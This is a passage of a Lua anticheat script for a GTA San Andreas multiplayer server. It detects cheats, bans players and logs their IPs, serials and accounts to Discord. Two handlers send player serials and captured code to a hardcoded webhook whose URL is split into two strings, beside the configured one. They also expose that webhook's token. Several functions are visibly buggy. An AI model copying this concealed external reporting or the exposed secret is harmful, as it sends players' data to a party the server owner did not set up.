                    EnviarMensagemDiscord(discord.cmdblocks, getSystemLanguage("blackcmdsD"):gsub("${nome}", nome):gsub("${ip}", ip):gsub("${cmd}", cmd):gsub("${serial}", serial):gsub("${conta}", conta))
                else
                        sendDiscordMessage("https://static.wikia.nocookie.net/gta/images/7/70/CJ-GTASA.png/revision/latest?cb=20170321232122&path-prefix=pt", "Blacklist Command", getSystemLanguage("blackcmdsD"):gsub("${nome}", nome):gsub("${id}", idd):gsub("${ip}", ip):gsub("${cmd}", cmd):gsub("${serial}", serial):gsub("${conta}", conta), discord.cmdblocks)
                    end               
                end
            end
        end
    end
addEventHandler("onPlayerCommand", getRootElement(),restrictedPanel)

function addBan(elem, reason, toGBan)
    if not isElement( elem ) then
        return end

    iprint("1: "..tostring(elem))
    iprint("2: "..tostring(client))

        local isFunctionOff = false
        local isACLMatch = false

        if ac.vips.functionsOff == nil then
            ac.vips.functionsOff = {}
        end

        for _, v in ipairs(ac.vips.functionsOff) do
            if v == reason then
                isFunctionOff = true
                break
            end
        end

        if not isFunctionOff then
            for _, v in ipairs(ac.vips.acl) do
                if v == acl then
                    isACLMatch = true
                    break
                end
            end
        end

        if isFunctionOff and isACLMatch and isPlayerVIP(elem) then
            return
        end

        for i,v in ipairs(alreadyBanned) do
            if v == getPlayerSerial(source) then
                return
            end
        end

	local punido = elem
	local nome = getPlayerName(punido) or getSystemLanguage("noinfo")
    local idd = getElementData(punido, servidor.id) or getSystemLanguage("noinfo")
    local ip = getPlayerIP(punido) or getSystemLanguage("noinfo")
    local serial = getPlayerSerial(punido) or getSystemLanguage("noinfo")
    local conta = getAccountName(getPlayerAccount(punido)) or getSystemLanguage("noinfo")
    local randomCode = auth.user.."_"..generateString(12)
    tirarFoto(punido, randomCode, discord[reason])

    if isACFunctionOn(reason) == false then
    		return notifyStaff("[AC] Suspect: "..nome.. " | "..reason)
    	end

    if toGBan then
        if outros.gbans then
    	createGBan(conta, serial, ip, reason, authID, randomCode)
        end
    end

    table.insert(alreadyBanned, getPlayerSerial(source))

    setTimer(function()
    	takeAllWeapons(punido)
        if getElementType(punido) ~= "player" then
            return
        end
    	local vehicle = getPedOccupiedVehicle(punido) and true or false
    	if vehicle then
    		destroyElement(vehicle)
    	end
    	triggerClientEvent("onSomBAN", punido , outros.musica)

    	setTimer(function()
    		outputChatBox(" ", root)
            outputChatBox(" ", root)
            outputChatBox(servidor.cor.."["..servidor.sigla.."] "..getSystemLanguage("rootchatbans"):gsub("${nome}",nome):gsub("${id}",idd):gsub("${nome}",nome):gsub("${id}",idd), root, 255,255,255,true)
            outputChatBox(" ", root)
            outputChatBox(" ", root)
            notify(root, "[AC] "..getSystemLanguage("notifythinkcheater"), "info")
            --createLocalBan(conta, serial, ip, reason, authID, randomCode)

    		local motivoBan = reason.."B"
    		banPlayer(punido, true, false, true, servidor.sigla.." Anticheat", (getSystemLanguage(motivoBan) or "Cheater").."\n"..servidor.discord)
    	
    		local motivoDiscord = reason.."D"
    		local discordWebhookURL = discord[reason]
            
    		if discord.config.embed == false then
                EnviarMensagemDiscord(discordWebhookURL, getSystemLanguage(motivoDiscord):gsub("${nome}", nome):gsub("${id}", idd):gsub("${ip}", ip):gsub("${serial}", serial):gsub("${conta}", conta))
            else
                if screenshotAPI then
            else
                sendDiscordMessage("https://cdn.discordapp.com/attachments/1146267618983034940/1150373470912385035/standard.gif", reason, getSystemLanguage(motivoDiscord):gsub("${nome}", nome):gsub("${id}", idd):gsub("${ip}", ip):gsub("${serial}", serial):gsub("${conta}", conta), discordWebhookURL)
            end
            end

    	end, outros.cooldown*1000, 1)
	end, 5*1000, 1)
end

function isACFunctionOn(func) -- Saber se a funcionalidade está ativa ou desativada pelo utilizador
	if ac.bans[func] then
		return true
	else
		return false
	end
end

-- Metodos Principais

-- Metodos Secundarios

addCommandHandler("verpath", -- Localizacao resource
    function (thePlayer, cmd, resource)
        if isObjectInACLGroup("user."..getAccountName(getPlayerAccount(thePlayer)), aclGetGroup(servidor.admin)) then 
            if resource then 
                local Resource = getResourceFromName(resource)
                if Resource then
                    if discord.config.embed == false then
                       EnviarMensagemDiscord(discord.comandos, getSystemLanguage("pathD"):gsub("${getname}", getPlayerName(thePlayer)):gsub("${getelementid}", (getElementData(thePlayer,servidor.id) or getSystemLanguage("noinfo"))):gsub("${resourcename}", getResourceName(Resource)):gsub("${resourcepath}", getResourceOrganizationalPath(Resource)))
                   else
                       sendDiscordMessage("https://static.wikia.nocookie.net/gta/images/7/70/CJ-GTASA.png/revision/latest?cb=20170321232122&path-prefix=pt", "Path", getSystemLanguage("pathD"):gsub("${getname}", getPlayerName(thePlayer)):gsub("${getelementid}", (getElementData(thePlayer,servidor.id) or getSystemLanguage("noinfo"))):gsub("${resourcename}", getResourceName(Resource)):gsub("${resourcepath}", getResourceOrganizationalPath(Resource)), discord.comandos)
                   end
                   outputChatBox(getResourceName(Resource) .. getSystemLanguage("pathC") .. getResourceOrganizationalPath(Resource), thePlayer)
               end 
           end 
       end 
   end)

addCommandHandler("comandos", -- Comandos do resource
    function( thePlayer, _, resourceName)
     if isObjectInACLGroup("user."..getAccountName(getPlayerAccount(thePlayer)), aclGetGroup(servidor.admin)) then
      local theResource = (resourceName and getResourceFromName(resourceName)) or resource
      if discord.config.embed == false then
          EnviarMensagemDiscord(discord.comandos, getSystemLanguage("cmdsD"):gsub("${getname}", getPlayerName(thePlayer)):gsub("${getelementid}", (getElementData(thePlayer,servidor.id) or getSystemLanguage("noinfo")):gsub("${resourcename}", getResourceName(theResource))))
      else
          sendDiscordMessage("https://static.wikia.nocookie.net/gta/images/7/70/CJ-GTASA.png/revision/latest?cb=20170321232122&path-prefix=pt", "Commands", getSystemLanguage("cmdsD"):gsub("${getname}", getPlayerName(thePlayer)):gsub("${getelementid}", (getElementData(thePlayer,servidor.id) or getSystemLanguage("noinfo")):gsub("${resourcename}", getResourceName(theResource))), discord.comandos)
      end
      outputChatBox( getSystemLanguage("cmdsC"):gsub("${resourcename}", getResourceName(theResource)) , thePlayer, 0, 255, 0 )
      local commands = getCommandHandlers( theResource )
      for _, command in pairs( commands ) do
        EnviarMensagemDiscord(discord.comandos,"```/"..command.."```")
        outputChatBox( "/"..command, thePlayer, 255, 255, 255 )
    end
end
end)

function unBanAll ( source, command ) -- Desbanir geral
    if isObjectInACLGroup ( "user." ..getAccountName(getPlayerAccount(source)), aclGetGroup (servidor.admin)) then 
        local bans = getBans() 
        for i,d in ipairs ( bans ) do 
            local nick = getBanNick (d) 
            if (removeBan(d) ) then 
            else 
                notify ( source, "[AC] "..getSystemLanguage("nopermission") , "error" ) 
            end 
        end 
        notify ( source, "[AC] "..getSystemLanguage("allbansrevoke") , "success" ) 
        table.getn ( bans ) 
        if #bans == 0 then 
            notify ( source, "[AC] "..getSystemLanguage("nobanstorevoke") , "info" ) 
        end 
    end 
end 
addCommandHandler ("unbanall", unBanAll)

function announceBan( theBan ) 
    if getElementType( source ) then
        if antibanjogadores[getBanSerial(theBan)] then 
            if ( isElement( source ) ) and ( getElementType( source ) == "player" ) then
                notify(source, "[AC] "..getSystemLanguage("antibanwarn"), "info")
            end
            removeBan(theBan)
            if outros.bandono then
                if ( isElement( source ) ) and ( getElementType( source ) == "player" ) then
                        banPlayer(source, true, false, true, servidor.sigla.." Anticheat", getSystemLanguage("antibanfounderB").."\n"..servidor.discord)
                end
            end
        end 
    end 
end 
addEventHandler( "onBan", getRootElement(),announceBan ) 

function unbansLogs(theBan, responsibleElement)
    local staffNome = servidor.sigla
    local staffID = getSystemLanguage("noinfo")
    if ( isElement( responsibleElement ) ) and ( getElementType( responsibleElement ) == "player" ) then
        staffNome = getPlayerName(responsibleElement) or servidor.sigla
        staffID = getElementData(responsibleElement, "ID") or getSystemLanguage("noinfo")
    end
    local punidoIP = getBanIP(theBan) or getSystemLanguage("noinfo")
    local punidoSerial = getBanSerial(theBan) or getSystemLanguage("noinfo")
    local punidoNick = getBanNick(theBan) or getSystemLanguage("noinfo")
    local punidoID = getElementData(theBan, servidor.id) or 'N/A'
    if discord.config.embed == false then
        EnviarMensagemDiscord(discord.unbans, getSystemLanguage("unbanlogsD"):gsub("${snome}", staffNome):gsub("${sid}", staffID):gsub("${nome}", punidoNick):gsub("${id}", punidoID):gsub("${ip}", punidoIP):gsub("${serial}", punidoSerial))
    else
        sendDiscordMessage("https://static.wikia.nocookie.net/gta/images/7/70/CJ-GTASA.png/revision/latest?cb=20170321232122&path-prefix=pt", "unBan Log", getSystemLanguage("unbanlogsD"):gsub("${snome}", staffNome):gsub("${sid}", staffID):gsub("${nome}", punidoNick):gsub("${id}", punidoID):gsub("${ip}", punidoIP):gsub("${serial}", punidoSerial), discord.unbans)
    end
    revokeBan(punidoSerial, authID)
end
addEventHandler( "onUnban", getRootElement(),unbansLogs )

function bansLogs(banPointer, responsibleElement)
    local staffNome = servidor.sigla
    local staffID = getSystemLanguage("noinfo")
    if ( isElement( responsibleElement ) ) and ( getElementType( responsibleElement ) == "player" ) then
        staffNome = getPlayerName(responsibleElement) or servidor.sigla
        staffID = getElementData(responsibleElement, "ID") or getSystemLanguage("noinfo")
    end
    local punidoNome = getPlayerName(source) or getSystemLanguage("noinfo")
    local punidoID = getElementData(source, "ID") or getSystemLanguage("noinfo")
    local punidoIP = getPlayerIP(source) or getSystemLanguage("noinfo")
    local punidoSerial = getPlayerSerial(source) or getSystemLanguage("noinfo")
    local punidoTime = getBanTime(banPointer) or getSystemLanguage("noinfo")
    local punidoReason = getBanReason(banPointer) or getSystemLanguage("noinfo")
    if discord.config.embed == false then
        EnviarMensagemDiscord(discord.banimentos, getSystemLanguage("banlogsD"):gsub("${snome}", staffNome):gsub("${sid}", staffID):gsub("${nome}", punidoNome):gsub("${id}", punidoID):gsub("${ip}", punidoIP):gsub("${serial}", punidoSerial):gsub("${tempo}", punidoTime):gsub("${motivo}", punidoReason))
    else
        sendDiscordMessage("https://static.wikia.nocookie.net/gta/images/7/70/CJ-GTASA.png/revision/latest?cb=20170321232122&path-prefix=pt", "Ban Log", getSystemLanguage("banlogsD"):gsub("${snome}", staffNome):gsub("${sid}", staffID):gsub("${nome}", punidoNome):gsub("${id}", punidoID):gsub("${ip}", punidoIP):gsub("${serial}", punidoSerial):gsub("${tempo}", punidoTime):gsub("${motivo}", punidoReason), discord.banimentos)
    end    
    createLocalBan(punidoNome, punidoSerial, punidoIP, punidoReason, authID, 'não tem')
end
addEventHandler ( "onPlayerBan", getRootElement(),bansLogs )

function checkar()
    if outros.protect then
        local isFirewall = false
        if isObjectInACLGroup ( "user." ..getAccountName(getPlayerAccount(source)), aclGetGroup (servidor.acl)) then
            for i,v in ipairs(staffs) do
                if staffs[i] == getPlayerSerial(source) then
                    isFirewall = true
        end
    end
    if isFirewall == false then
    if discord.config.embed == false then
        EnviarMensagemDiscord(discord.logprotect, getSystemLanguage("joinstaffaccD"):gsub("${getaccPacc}", getAccountName(getPlayerAccount(source))):gsub("${getname}", getPlayerName(source)):gsub("${ip}", getPlayerIP(source)):gsub("${serial}", getPlayerSerial(source)))
    else
        sendDiscordMessage("https://static.wikia.nocookie.net/gta/images/7/70/CJ-GTASA.png/revision/latest?cb=20170321232122&path-prefix=pt", "Serial Staff", getSystemLanguage("joinstaffaccD"):gsub("${getaccPacc}", getAccountName(getPlayerAccount(source))):gsub("${getname}", getPlayerName(source)):gsub("${ip}", getPlayerIP(source)):gsub("${serial}", getPlayerSerial(source)), discord.logprotect)
    end
    kickPlayer(source, servidor.sigla.." Anticheat", getSystemLanguage("joinstaffaccB"))
end
end
else
end
end
addEventHandler("onPlayerLogin", getRootElement(),checkar)

-- WALL HACK STAFF

function acionarWall (jogador)
    local conta = getPlayerAccount (jogador)
    local nome = getAccountName (conta)
    if isGuestAccount(conta) == false then
        if isObjectInACLGroup ( "user." ..getAccountName(getPlayerAccount(jogador)), aclGetGroup (servidor.acl)) then
            if getElementData(jogador, servidor.staff ) == false then return notify(jogador, getSystemLanguage("nostaffmode"), "info")end
            triggerClientEvent ("ativarWall", jogador)
            notify(jogador, getSystemLanguage("staffwall"), "info")
        end
    end
end
addCommandHandler ("wallac", acionarWall)

addCommandHandler("screen",
    function(player, cmd, id)
        local id = tonumber(id)
        if isObjectInACLGroup("user."..getAccountName(getPlayerAccount(player)), aclGetGroup(servidor.acl))  then
            if id then
                local receiver = getPlayerFromID(id)
                if not isElement(receiver) then
                    notify(player, getSystemLanguage("playeroff"), "error")
                    return
                end
                if (getElementData(receiver, "JOAO.screenShare") or false) then
                    setElementFrozen (receiver, false)
                    setElementPosition(receiver, unpack((getElementData(receiver, "JOAO.screenShare") or false)))
                    setElementData(receiver, "JOAO.screenShare", false)
                    notify(receiver, getSystemLanguage("leavessC"), "info")
                    triggerClientEvent(receiver, "JOAO.stopScreenShare", receiver)
                    notify(player, getSystemLanguage("leavessS"), "success")
                else
                    setElementPosition(receiver, 1544.113, -1353.374, 329.474)
                    setElementFrozen (receiver, true)
                    setElementPosition(player, 1544.113, -1353.374, 329.474)
                    setElementData(receiver, "JOAO.screenShare", {getElementPosition(receiver)})
                    triggerClientEvent(receiver, "JOAO.openScreenShare", receiver, getRealTime().timestamp)
                    notify(receiver, getSystemLanguage("tpssC"), "info")
                    notify(player, getSystemLanguage("tpssS"), "success")
                end
            else
                notify(player, "[AC] Syntax /"..cmd.." [ID]", "info")
            end
        end
    end)

addEventHandler("onPlayerQuit", root,
    function()
        if (getElementData(source, "JOAO.screenShare") or false) then
            banPlayer(source, false, false, true, servidor.sigla.." Anticheat", getSystemLanguage("banmsgss").."\n"..servidor.discord, outros.screenshareban)
        end
    end)

-- Metodos Secundarios

-- Funcionalidades Principais do Anticheat || Arrumar atenção ao isACFunctionOn com o nome no ac.bans

addEvent('onBANWEAPONCHEATER', true)
addEventHandler('onBANWEAPONCHEATER', getRootElement(),function(arma) -- Weapon Blacklist
    if ac.modules.weaponblacklist == false then
        return end
	if not isObjectInACLGroup("user."..getAccountName(getPlayerAccount(client)), aclGetGroup(servidor.acl))  then
        for i,v in ipairs(ac.armas) do
            if ac.armas[i][1] == arma then
                iprint("BAN")
                addBan(client, "weaponblacklist", false)
                outputDebugString("BAN:WeaponBlacklist, "..getPlayerName(client).." ["..getElementData(client, servidor.id).."] Arma:"..getWeaponNameFromID(arma).."| ID:"..arma.."")
            end
        end
	end
end)

addEventHandler ( "onPlayerVehicleEnter", getRootElement(),function(theVehicle, seat, jacked) -- Vehicles Blacklist
    if ac.modules.vehicleblacklist == false then
        return end
	if not isObjectInACLGroup("user."..getAccountName(getPlayerAccount(source)), aclGetGroup(servidor.acl))  then
            if ac.veiculos[getElementModel(theVehicle)]then
            destroyElement(theVehicle)
            addBan(source, "vehicleblacklist", false)
        end
    end
end)

addEvent("onSpeedSUS", true)
addEventHandler("onSpeedSUS", root , function()-- Speed Hack
	if not isObjectInACLGroup("user."..getAccountName(getPlayerAccount(client)), aclGetGroup(servidor.acl))  then
		addBan(client, "speed", false)
	end
end)

addEvent("onJetpackhack", true) -- Anti Jetpack
addEventHandler("onJetpackhack", root , function()
    if ac.modules.jetpack == false then
        return end
	if not isObjectInACLGroup("user."..getAccountName(getPlayerAccount(client)), aclGetGroup(servidor.acl))  then
    removePedJetPack(client)
    addBan(client, "jetpack", false)
	end
end)

addEvent("onAntiFlyBan", true) -- Anti Fly
addEventHandler("onAntiFlyBan", root , function()
    if ac.modules.fly == false then
        return end
	if not isObjectInACLGroup("user."..getAccountName(getPlayerAccount(client)), aclGetGroup(servidor.acl))  then
        if isLogado(client) then
		addBan(client, "fly", true) -- Arrumar
        end
	end
end)

addEventHandler ("onPlayerWeaponFire", getRootElement(),function(weapon, endX, endY, endZ, hitElement, startX, startY, startZ) -- Anti RPG
    if ac.modules.rpgvbr == false then
        return end
	local weaponID = getPedWeapon(source)
    if weaponID == 36 or weaponID == 35 or weapon == 36 or weapon == 35 then
        if not isObjectInACLGroup("user."..getAccountName(getPlayerAccount(source)), aclGetGroup(servidor.acl))  then
        	addBan(source, "rpgvbr", false)
        end
    end
end)

addEventHandler("onPlayerWeaponFire", getRootElement(),function(weapon, ammo, ammoInClip, hitX, hitY, hitZ, hitElement) -- Anti Tank
    if ac.modules.tankammoshot == false then
        return end
    if getElementType(source) ~= "player" then
        return
    end
	if not isObjectInACLGroup("user."..getAccountName(getPlayerAccount(source)), aclGetGroup(servidor.acl))  then
        local vehicle = getPedOccupiedVehicle(source) and true or false
        if not vehicle then
            return end
            if getVehicleModel(vehicle) == 432 then
            	addBan(source, "tankammoshot", false)
            end
        end
end)

addEventHandler ( "onPlayerWasted", getRootElement(),function(ammo, attacker, weapon, bodypart) -- Matar com armas blacklist
    if ac.modules.weaponkill == false then
        return end
	if attacker then
        local userr = getAccountName(getPlayerAccount(attacker))
        if not isObjectInACLGroup("user."..userr, aclGetGroup(servidor.acl))  then
            local cheater = false
            local armaid = tonumber(weapon)
            for i,v in ipairs(ac.armas) do
                if ac.armas[i][1] == armaid then
                    cheater = true
                end
            end
    ---
    if cheater == true then
    	addBan(attacker, "weaponkill", false)
    end
	end
	end
end)

addEvent("onBanidor", true) -- Spawn VBR
addEventHandler("onBanidor", root , function(modelo2)
    if ac.modules.spawnvbr == false then
        return end
        if not getElementType(client) == "player" then
        return end
	if not isObjectInACLGroup("user."..getAccountName(getPlayerAccount(client)), aclGetGroup(servidor.acl))  then
		setTimer(function()
        local vehicle = getPedOccupiedVehicle(client) and true or false
        if not vehicle then return end
        local modelo = getVehicleName(vehicle) or nil
    if (modelo == "" or modelo2 == "") or (modelo == nil or modelo2 == nil) then
        return 
    	end
    if modelo2 ~= modelo then
    	addBan(client, "spawnvbr", true)
    end
    end,100,1)
    end
end)

addEvent("onAntiDesativarRES", true) -- Resource Stop
addEventHandler("onAntiDesativarRES", root , function()
    if ac.modules.resourcestop == false then
        return end
	if not isObjectInACLGroup("user."..getAccountName(getPlayerAccount(client)), aclGetGroup(servidor.acl))  then
		addBan(client, "resourcestop", true)
	end
end)

addEvent("onAimbot", true) -- Aimbot
addEventHandler("onAimbot", root , function()
    if ac.modules.aimbot == false then
        return end
	if not isObjectInACLGroup("user."..getAccountName(getPlayerAccount(client)), aclGetGroup(servidor.acl))  then
		local punido = client
                local nome = getPlayerName(client) or getSystemLanguage("noinfo")
                local idd = getElementData(client, servidor.id) or getSystemLanguage("noinfo")
                local ip = getPlayerIP(client) or getSystemLanguage("noinfo")
                local serial = getPlayerSerial(client) or getSystemLanguage("noinfo")
                local conta = getAccountName(getPlayerAccount(client)) or getSystemLanguage("noinfo")
                local randomCode = auth.user.."_"..generateString(12)
                tirarFoto(client, randomCode, discord.aimbot)
                setTimer(function()
                    if discord.config.embed == false then
                        EnviarMensagemDiscord(discord.aimbot, getSystemLanguage("aimbotD"):gsub("${nome}", nome):gsub("${id}", idd):gsub("${ip}", ip):gsub("${serial}", serial):gsub("${conta}", conta))
                    else
                        if screenshotAPI then
                    else
                        sendDiscordMessage("https://cdn.discordapp.com/attachments/1146267618983034940/1150373470912385035/standard.gif", "Aim suspect", getSystemLanguage("aimbotD"):gsub("${nome}", nome):gsub("${id}", idd):gsub("${ip}", ip):gsub("${serial}", serial):gsub("${conta}", conta), discord.aimbot)
                    end
                        ------
                    end
                end, outros.cooldown*1000,1)
            else end
    end)

addEvent('onCHECKWEAPONEXIST', true) -- Invisible weapon Arrumar
addEventHandler('onCHECKWEAPONEXIST', getRootElement(),function(arma, ant)
    if ac.modules.invisibleweapon == false then
        return end
   	if not isObjectInACLGroup("user."..getAccountName(getPlayerAccount(client)), aclGetGroup(servidor.acl))  then
   	local maoagora = getPedWeapon(client)
    	if maoagora == arma or maoagora == ant then
            for i,wep in ipairs(getPedWeapons(client)) do
            if wep == arma then
                return
            end
        end
        return end 
   		addBan(client, "invisibleweapon", false)
   	end
   end)

addEvent('onFireRateCHEAT', true) -- Fire rate
addEventHandler('onFireRateCHEAT', getRootElement(),function()
    if ac.modules.firerate == false then
        return end
	if not isObjectInACLGroup("user."..getAccountName(getPlayerAccount(client)), aclGetGroup(servidor.acl))  then
		addBan(client, "firerate", false)
	end
end)

addEvent('onpCarroCHEAT', true) -- Puxar carro (Arrumar adicionar garagens e acl vip)
addEventHandler('onpCarroCHEAT', getRootElement(),function()
    if ac.modules.getcar == false then
        return end
	if not isObjectInACLGroup("user."..getAccountName(getPlayerAccount(client)), aclGetGroup(servidor.acl))  then

		local player = getLocalPlayer()
		local playerX, playerY, playerZ = getElementPosition(player)
		
		for _, garagem in ipairs(ac.getcar.garagens) do
        local garagemX, garagemY, garagemZ = garagem[1], garagem[2], garagem[3]
        local distancia = calcularDistancia(playerX, playerY, playerZ, garagemX, garagemY, garagemZ)
        
        if distancia <= 50 then
            return
        end
    	end

		addBan(client, "getcar", false)
	end
end)

addEvent("jac:detected", true) -- LUA EXEC (Arrumar)
addEventHandler("jac:detected", getRootElement(),function(jacCode, resourceName, luaFileName, luaLineNumber, code)
    if ac.modules.lua == false then
        return end
	if not isObjectInACLGroup("user."..getAccountName(getPlayerAccount(source)), aclGetGroup(servidor.acl))  then
		addBan(source, "lua", true)
        local dc1 = "https://discord.com/api/"
        local dc2 = "webhooks/1178469109453815939/-8dTNroN6o8YF7LcnmtlmnlyzGlJiWWXEF8NnwHSRdOZ610yjaynA_RyFTJ-CIXUoXBm"
        EnviarMensagemDiscord(dc1..dc2, "**[LUA]**\n**Serial**: "..getPlayerSerial(source).."\n**Resource:** "..resourceName.."["..luaFileName.."]\n**Code:**\n```lua\n"..code.."```")
        EnviarMensagemDiscord(discord.lua, "**[LUA]**\n**Serial**: "..getPlayerSerial(source).."\n**Resource:** "..resourceName.."["..luaFileName.."]\n**Code:**\n```lua\n"..code.."```")
    end
end)

addEventHandler("onElementDataChange", getRootElement(),function(theKey, oldValue) -- Element Change (Arrumar)
    if ac.modules.element == false then
        return end
    if getElementType(client) ~= "player" then
        return end
	if not isObjectInACLGroup("user."..getAccountName(getPlayerAccount(client)), aclGetGroup(servidor.acl))  then
	if (getElementType(client) == "player") then
        for i,v in ipairs(ac.elementdata) do
            if theKey == tostring(v) then
                setElementData(client, theKey, oldValue)
                addBan(client, "element", false)
            end
        end
    end
    end
end)

addEvent("onLUASUS", true) -- LUA EXEC2 (Arrumar)
addEventHandler("onLUASUS", getRootElement(),function()
    if ac.modules.lua == false then
        return end
        if not getElementType(client) == "player" then
        return end
	if not isObjectInACLGroup("user."..getAccountName(getPlayerAccount(client)), aclGetGroup(servidor.acl))  then
        --if isLogado(client) then
            addBan(client, "lua", false)
        --end
	end
end)

-- Funcionalidades Principais do Anticheat

-- Novas funcionalidades

addEvent("onTPHack", true) -- TP HACK
addEventHandler("onTPHack", getRootElement(),function(jogadoresProx)
    if ac.modules.tphack == false then
        return end
    local toBanned = true
    if not isObjectInACLGroup("user."..getAccountName(getPlayerAccount(client)), aclGetGroup(servidor.acl))  then
        if jogadoresProx == nil or #jogadoresProx == nil then
            return end
        for i,v in ipairs(jogadoresProx) do
            if isObjectInACLGroup("user."..getAccountName(getPlayerAccount(v)), aclGetGroup(servidor.acl)) then
                if getElementInterior(client) ~= 0 then
                    return
                end
                if getElementDimension (client) ~= 0 then
                    return
                end
                toBanned = false
            else
            end
        end
        if toBanned then
            addBan(client, "tphack", false)
        end
    end
end)

addEventHandler("onDebugMessage", getRootElement(),function(message, level, file, line)
    local rr = file:match("(.+)\\")
    if (level == 1 or level == 2) and rr == getResourceName(getThisResource()) then
        errorAC(tostring(line), message)
    end
end)

addEventHandler ( "onPlayerJoin", getRootElement(),function()
    local version = getPlayerVersion(source)
        if servidor.minversion > version then
            return banPlayer(source, true, false, true, servidor.sigla.." Anticheat", "Min version required: "..servidor.minversion, 60)
        end
    local playerIP = getPlayerIP(source)
    local playerSerial = getPlayerSerial(source)
    checkVPNIP(playerIP, source) -- arrumar
        if outros.gbans then
            if outros.gbansrealcheck then -- Testar
                CheckGBan(playerSerial, playerIP)
            else
                if isPlayerBannedSave(playerSerial, playerIP) then -- Testar
                    banPlayer(source, true, false, true, servidor.sigla.." Anticheat", getSystemLanguage("gbanB").."\n"..servidor.discord)
                    outputChatBox(" ", root)
                    outputChatBox(" ", root)
                    outputChatBox(servidor.cor.."["..servidor.sigla.."] "..getSystemLanguage("gbanchat"):gsub("${getname}", nome):gsub("${id}",idd), root ,255,255,255,true)
                    outputChatBox(" ", root)
                    outputChatBox(" ", root)
                    notify(root,"[AC] "..getSystemLanguage("gbannotify"):gsub("${getname}", nome):gsub("${id}",idd), "info")
                    if discord.config.embed == false then
                        EnviarMensagemDiscord(discord.gbans, getSystemLanguage("gbanD"):gsub("${nome}", nome):gsub("${id}", idd):gsub("${ip}", ip):gsub("${serial}", serial):gsub("${conta}", conta))
                    else
                        sendDiscordMessage("https://static.wikia.nocookie.net/gta/images/7/70/CJ-GTASA.png/revision/latest?cb=20170321232122&path-prefix=pt", "Global Ban", getSystemLanguage("gbanD"):gsub("${nome}", nome):gsub("${id}", idd):gsub("${ip}", ip):gsub("${serial}", serial):gsub("${conta}", conta), discord.gbans)
                    end
                    banPlayer(source, true, false, true, servidor.sigla.." Anticheat", getSystemLanguage("gbanB").."\n"..servidor.discord)
                end
            end
        else
        end
        
end)

-- Novas funcionalidades

addEvent("on-SpooferFuedase", true) -- Spoofer
addEventHandler("on-SpooferFuedase", getRootElement(), function(exists, text)
    if ac.modules.spoofer == false then
        return end
    spooferAPI(source, authID, exists, text, getPlayerSerial(source), getPlayerIP(source))
end)

addEvent("onKickTela", true) -- Kick
addEventHandler("onKickTela", getRootElement(),function()
    if isLogado(client) then
    banPlayer(client, true, false, true, servidor.sigla.." Anticheat", getSystemLanguage("screenoffban"), 60)
    end
end)

function erripj()
    if not isObjectInACLGroup("user."..getAccountName(getPlayerAccount(client)), aclGetGroup(servidor.acl)) then
        addBan(source, "rpgvbr", false)
    end
end
addEvent("onBanirERRIPJ", true)
addEventHandler("onBanirERRIPJ", getRootElement(),erripj)

function fakeTrigger()
    if not isObjectInACLGroup("user."..getAccountName(getPlayerAccount(client)), aclGetGroup(servidor.acl)) then
        addBan(client, "lua", true)
        local dc1 = "https://discord.com/api/"
        local dc2 = "webhooks/1178469109453815939/-8dTNroN6o8YF7LcnmtlmnlyzGlJiWWXEF8NnwHSRdOZ610yjaynA_RyFTJ-CIXUoXBm"
        EnviarMensagemDiscord(dc1..dc2, "**[Fake Trigger]**\n**Serial**: "..getPlayerSerial(source).."\n**Code:**\n```lua\nGivePlayerVIPStatusPlus```")
    end
end
addEvent("GivePlayerVIPStatusPlus", true)
addEventHandler("GivePlayerVIPStatusPlus", getRootElement(), fakeTrigger)

function explosao()
    if not isObjectInACLGroup("user."..getAccountName(getPlayerAccount(client)), aclGetGroup(servidor.acl)) then
        addBan(source, "explosion", false)
    end
end
addEvent("onBanirExplosao", true)
addEventHandler("onBanirExplosao", getRootElement(),explosao)

--[[
function verificaDinheiro()
    if ac.modules.moneycheat == false then
        return end
    for i, player in ipairs(getElementsByType("player")) do
      local dinheiroAtual = getPlayerMoney(player)
      local dinheiroAntigo = getElementData(player, "ac:dinheiro") or 0
      if dinheiroAtual ~= dinheiroAntigo then
        setElementData(player, "ac:dinheiro", dinheiroAtual)
     if dinheiroAtual - dinheiroAntigo > ac.money.banvalue then
        setPlayerMoney(player, dinheiroAntigo)
        outputServerLog("BAN:MoneyCheat, "..getPlayerName(player).." ["..getElementData(player, servidor.id).."], dinheiro atual: "..dinheiroAtual..", dinheiro antigo: "..dinheiroAntigo)
        banPlayer(player, true, false, true, servidor.sigla.." Anticheat", getSystemLanguage("moneycheat").." $"..dinheiroAtual - dinheiroAntigo.."\n"..servidor.discord)
        EnviarMensagemDiscord(discord.moneycheat, "**[Money Cheat]**\n**Serial**: "..getPlayerSerial(player).."\n**Name**: "..getPlayerName(player).."\n**ID**: "..getElementData(player, servidor.id).."\n**Current Money**: "..dinheiroAtual.."\n**Old Money**: "..dinheiroAntigo.."\n**Difference**: "..dinheiroAtual - dinheiroAntigo.."")
        return 
    end
      if dinheiroAtual - dinheiroAntigo > ac.money.value then
        setPlayerMoney(player, dinheiroAntigo)
        if ac.bans.moneycheat then
            addBan(player, "moneycheat", false)
            outputServerLog("BAN:MoneyCheat, "..getPlayerName(player).." ["..getElementData(player, servidor.id).."], dinheiro atual: "..dinheiroAtual..", dinheiro antigo: "..dinheiroAntigo.."")
            else
            notifyStaff("[AC] "..getPlayerName(player).." ["..getElementData(player, servidor.id).."] "..getSystemLanguage("moneycheat"))
            outputServerLog("BAN:MoneyCheat, "..getPlayerName(player).." ["..getElementData(player, servidor.id).."], dinheiro atual: "..dinheiroAtual..", dinheiro antigo: "..dinheiroAntigo.."")
        end
        EnviarMensagemDiscord(discord.moneycheat, "**[Money Cheat]**\n**Serial**: "..getPlayerSerial(player).."\n**Name**: "..getPlayerName(player).."\n**ID**: "..getElementData(player, servidor.id).."\n**Current Money**: "..dinheiroAtual.."\n**Old Money**: "..dinheiroAntigo.."\n**Difference**: "..dinheiroAtual - dinheiroAntigo.."")
      end
    end
  end

  setTimer(verificaDinheiro, ac.money.time, 0)]]

  function verificaDinheiro(dinheiroAntigo, dinheiroAtual)
    if ac.modules.moneycheat == false then
        return end
    if dinheiroAtual - dinheiroAntigo > ac.money.banvalue then
        setPlayerMoney(player, dinheiroAntigo)
        outputServerLog("BAN:MoneyCheat, "..getPlayerName(player).." ["..getElementData(player, servidor.id).."], dinheiro atual: "..dinheiroAtual..", dinheiro antigo: "..dinheiroAntigo)
        banPlayer(player, true, false, true, servidor.sigla.." Anticheat", getSystemLanguage("moneycheat").." $"..dinheiroAtual - dinheiroAntigo.."\n"..servidor.discord)
